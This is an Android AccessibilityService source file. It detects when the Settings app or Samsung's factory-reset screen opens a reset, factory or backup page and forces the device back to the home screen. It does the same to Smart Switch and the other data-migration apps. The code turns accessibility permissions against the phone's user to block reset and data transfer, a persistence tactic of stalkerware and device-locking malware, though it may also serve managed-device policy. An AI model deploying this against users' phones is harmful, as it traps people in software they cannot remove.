package com.mrog.tool;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

public class MyAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null)
            return;

        String pkgName = event.getPackageName().toString();
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        // DETECT FACTORY RESET ATTEMPTS
        if (pkgName.contains("com.android.settings") || pkgName.contains("com.sec.android.app.factoryreset")) {

            // Check Keywords in Class Name
            if (className.toLowerCase().contains("reset") ||
                    className.toLowerCase().contains("factory") ||
                    className.toLowerCase().contains("backup")) {

                // ACTION: KILL IT / GO HOME
                performGlobalAction(GLOBAL_ACTION_HOME);
                Toast.makeText(this, "Action Blocked by Administrator", Toast.LENGTH_SHORT).show();
            }
        }

        // Also block Smart Switch if needed
        if (pkgName.contains("smartswitch") || pkgName.contains("easymover")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            performGlobalAction(GLOBAL_ACTION_HOME);
        }
    }

    @Override
    public void onInterrupt() {
        // Required method
    }
}
